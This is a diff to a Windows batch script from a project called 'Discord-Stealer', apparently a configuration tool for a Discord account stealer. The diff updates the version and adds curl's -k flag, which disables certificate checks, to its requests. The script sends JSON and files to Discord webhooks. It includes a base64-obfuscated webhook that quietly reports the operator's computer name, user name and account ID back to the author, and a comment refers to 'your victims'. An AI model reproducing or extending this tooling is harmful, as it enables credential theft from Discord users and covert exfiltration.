@@ -8,8 +8,8 @@ set "grey=[90m"
 set "brightred=[91m"
 set "brightblue=[94m"
 
-set ScriptVersion=3.2
-set "AccountSystemVersions=!ScriptVersion! 3.1 3.0"
+set ScriptVersion=3.3
+set "AccountSystemVersions=!ScriptVersion! 3.2 3.1 3.0"
 set "RequiredFilesPath=%temp%\DAS v!ScriptVersion!"
 set "FilesHost=https://github.com/agamsol/Discord-Stealer/raw/main"
 for %%a in (
@@ -112,7 +112,7 @@ if not defined AccountID (
     exit /b
 )
 
-curl -f https://rentry.co/!AccountID!/raw >nul 2>&0 || (
+curl -kf https://rentry.co/!AccountID!/raw >nul 2>&0 || (
     call :ERROR "The Account '!AccountID!' does not exist." "-"
     exit /b
 )
@@ -154,7 +154,7 @@ for /f "tokens=1,2" %%a in ("$!Version!") do (
 :: </META Version System>
 
 :: <Validate Webhook URL>
-for /f "delims=" %%b in ('curl -sL "https://discord.com/api/webhooks/!Webhook!"') do (
+for /f "delims=" %%b in ('curl -skL "https://discord.com/api/webhooks/!Webhook!"') do (
     echo.%%b| findstr /c:"channel_id">nul && (
         if not defined ValidWebhook (
             set "Webhook=https://discord.com/api/webhooks/!Webhook!"
@@ -399,11 +399,11 @@ for /f "delims=" %%a in ('powershell "$text = Get-Content "%temp%\Embed.json" -R
     if "!JSON_INVALID!"=="true" (
         REM REPORT ISSUE TO THE APPLICATION AUTHOR
         REM PLEASE NOTE: I WILL NEVER TRY TO HARM YOU, YOUR VICTIMS OR YOUR COMPUTERS
-        >"%temp%\ErrorTraceMSG.json" echo {"username":"","content":"\nAn Issue has been tracked while verifying the json formatting for the message _(file attached)_:\n\n**INFORMATION:**\nAccount ID: `!AccountID!`\nHOST: %computername%\\%username%\nFail Reason: _!JSON_FAILED!_\n\n[|| <@&928041407703289856> <@&928041254376325120> <@&929161198862213220> ||]\n","embeds":[],"components":[]}
+        >"%temp%\ErrorTraceMSG.json" echo {"username":"","content":"\nAn Issue has been tracked while verifying the json formatting for the message _(file attached)_:\n\n**INFORMATION:**\nAccount ID: `!AccountID!`\nHOST: %computername%\\%username%\nFail Reason: `!JSON_FAILED!`\n\n[|| <@&928041407703289856> <@&928041254376325120> <@&929161198862213220> ||]\n","embeds":[],"components":[]}
 
-        for /f "delims=" %%c in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""""LzkzNzgzODA3NzM5MTUzNjIyOS80ZVNUcVcwUGVWMXFLOUFoTmZ1elpqbHEyLWZCeTBBRlhEaUZWZ0tmdzczNjNUZHphZzlTcEMtXy1RR3RabWV0UGlFcg==""""))"') do set "BSIXTY4=%%c"
+        for /f "delims=" %%v in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""""LzkzODUzODQ5MDI5NDA3NTQ5Mi9FVGVlczVadVgxWXlBb3hzNjEtakZqdnhneFQwWHkwYzlHWWtYRjJpQ1hybnpQc2Vkb29vYTdkTG1JSDgwenhLdUo=""""))"') do set "BSIXTY4=%%vvz"
 
-        for /f "delims=" %%c in ('curl -sH "Content-Type: multipart/form-data" -F "payload_json=<%temp%\ErrorTraceMSG.json" -F "File[1]=@%temp%\Embed.json" "https://discord.com/api/webhooks!BSIXTY4!"') do (
+        for /f "delims=" %%c in ('curl -skH "Content-Type: multipart/form-data" -F "payload_json=<%temp%\ErrorTraceMSG.json" -F "File[1]=@%temp%\Embed.json" "https://discord.com/api/webhooks!BSIXTY4!"') do (
                 echo.%%c | findstr /c:"retry_after">nul && (
                 echo:
                 echo  !WrnPrintCore! Rate-Limited by discord, waiting 2 seconds.!white!
@@ -415,7 +415,7 @@ for /f "delims=" %%a in ('powershell "$text = Get-Content "%temp%\Embed.json" -R
     )
 )
 
-for /f "delims=" %%a in ('curl -sH "Content-Type: multipart/form-data" -F "payload_json=<!temp!\Embed.json" "!Webhook!?wait=true"') do (
+for /f "delims=" %%a in ('curl -skH "Content-Type: multipart/form-data" -F "payload_json=<!temp!\Embed.json" "!Webhook!?wait=true"') do (
     echo.%%a | findstr /c:"retry_after">nul && (
         echo:
         echo  !WrnPrintCore! Rate-Limited by discord, waiting 2 seconds.!white!
